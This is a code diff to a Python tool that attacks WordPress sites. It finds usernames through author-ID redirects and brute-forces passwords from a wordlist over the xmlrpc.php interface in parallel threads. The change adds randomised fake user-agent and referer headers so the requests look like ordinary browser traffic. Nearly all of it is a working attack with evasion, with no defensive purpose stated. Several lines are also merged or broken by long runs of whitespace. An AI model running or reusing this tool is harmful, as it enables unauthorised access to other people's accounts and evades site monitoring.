@@ -1,5 +1,6 @@
 import requests
 import threading
+import random
 from queue import Queue
 import xml.etree.ElementTree as ET
 
@@ -22,10 +23,23 @@ else:
     xmlrpc_url = target_url
 
 wordlist = input("Path to password wordlist: ")
-threads_count = int(input("Number of threads: "))
-
+threads_count = int(input("Number of threads: "))                                       
 password_queue = Queue()
+                                                                                        fake_user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",                                                              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
+]
 
+fake_referers = [
+    "https://google.com",
+    "https://bing.com",
+    "https://yahoo.com",
+    "https://duckduckgo.com",
+    "https://baidu.com",
+    "https://yandex.com",
+]
 
 def find_usernames(url):
     usernames = set()
@@ -33,8 +47,7 @@ def find_usernames(url):
         try:
             author_url = f"{url}/?author={i}"
             response = requests.get(author_url, timeout=5, allow_redirects=True)
-            if response.status_code == 200 and response.url != author_url:
-                username = response.url.rstrip("/").split("/")[-1]
+            if response.status_code == 200 and response.url != author_url:                              username = response.url.rstrip("/").split("/")[-1]
                 usernames.add(username)
         except Exception:
             continue
@@ -69,7 +82,11 @@ def brute_force(username):
             </params>
         </methodCall>
         """
-        headers = {'Content-Type': 'application/xml'}
+        headers = {
+            'Content-Type': 'application/xml',
+            'User-Agent': random.choice(fake_user_agents),
+            'Referer': random.choice(fake_referers),
+        }
         try:
             response = requests.post(xmlrpc_url, data=payload, headers=headers, timeout=5)
             if response.status_code == 200 and parse_response(response.text):
